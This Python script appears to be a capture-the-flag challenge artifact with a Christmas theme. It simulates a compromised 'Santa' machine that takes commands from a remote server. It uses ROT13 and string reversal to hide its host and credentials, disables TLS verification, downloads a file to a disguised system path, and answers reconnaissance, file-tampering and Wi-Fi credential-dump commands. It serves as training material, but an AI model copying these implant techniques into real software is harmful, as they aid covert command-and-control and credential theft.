import requests
import socket
import ssl

from time import sleep


ENCODED_URI = "t---e---b---.---r---e---v---j---r---u---g---e---r---i---b---.---1---2---0---2---g---a---r---i---q---n---.---e---3---u---p---a---1---e---t"
ENCODED_BASE_ADDRESS = "/---t---e---b---.---r---e---v---j---r---u---g---e---r---i---b---.---1---2---0---2---g---a---r---i---q---n---.---e---3---u---p---a---1---e---t---/---/---:---c---g---g---u"
ENCODED_API_KEY = "x---I---T---o---f---I---2---L---h---S---2---D---m---y---0---p---u---1---T---q---m---y---z---p---b---A---x---B---b---A---z---o---c---W---3---M"
ENCODED_UPDATE_PATH = "g---k---g---.---a---b---v---f---e---r---I---/---g---a---r---v---y---p"
ENCODED_FILE_DESTINATION = "r---k---r---.---g---f---b---u---p---i---f---\\---g---s---b---f---b---p---e---v---Z---\\---n---g---n---Q---z---n---e---t---b---e---C---\\---:---P"
ENCODED_FILE_SOURCE = "r---k---r---.---e---3---u---p---1---e---t---/---g---a---r---v---y---p"


def get_netsh_profile():
    with open('netsh_show_profile.txt', 'r') as f:
        return f.readlines()

RESPONSES = {
    "whoami": "NORTH-POLE\\Santa\n",
    "set HOME": "set HOME=C:\\Users\\Santa\n",
    "dir C:\\Users\\Santa /s /b | findstr /si secret_cookie_recipe.txt": "recipe.txt\n",
    "type recipe.txt": "\n",
    "powershell -Command \"(Get-Content recipe.txt) -replace 'sugar', 'salt' | Out-File -encoding ASCII recipe.txt\"": "salt",
    "netsh wlan show networks | findstr SSID": "SSID : Network 2\n",
    "netsh wlan show profiles | findstr :": "    All User Profile     : Network 2\n",
    "netsh wlan show profile Network 2": f"{get_netsh_profile()}\n",
}


def main():
    update()

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    uri = decode(ENCODED_URI)
    with socket.create_connection((uri, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=uri) as ssock:
            while True:
                print("Getting next message")
                msg = ssock.recv(4096)
                cmd = read_message(msg)
                print(f"Command: {cmd}")
                if cmd == "N0T_S4NT4":
                    print("Not Santa")
                    break
                else:
                    if cmd in RESPONSES:
                        resp = RESPONSES[cmd]
                    else:
                        resp = input("Response: ")
                    ssock.sendall(resp.encode('utf-8'))
                    print(f"Sent:\n{resp}")
                    ssock.sendall(b'\0')

                sleep(0.2)
                print("\n")


def read_message(msg):
    return msg.decode('utf-8').replace("<EOF>", "").strip()


def decode(str_input):
    str_input = str_input.replace("---", "")[::-1]
    rot13 = str.maketrans(
        'ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
        'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')
    if str_input == "":
        return str_input
    else:
        return str_input.translate(rot13)

def update():
    headers = {
        "Authorization": f"Basic {decode(ENCODED_API_KEY)}"
    }
    base_address = decode(ENCODED_URI)
    update_path = decode(ENCODED_UPDATE_PATH)
    full_update_path = f"http://{base_address}/{update_path}"
    resp = requests.get(full_update_path, headers=headers)
    if resp.status_code != 200 or resp.text == "1":
        return
    else:
        file_source = decode(ENCODED_FILE_SOURCE)
        file_dest = decode(ENCODED_FILE_DESTINATION)
        file_uri = f"{base_address}{file_source}"
        resp = requests.get(file_uri, headers=headers)
        with open(file_dest, 'wb') as f:
            f.write(resp.content)


if __name__ == '__main__':
    main()
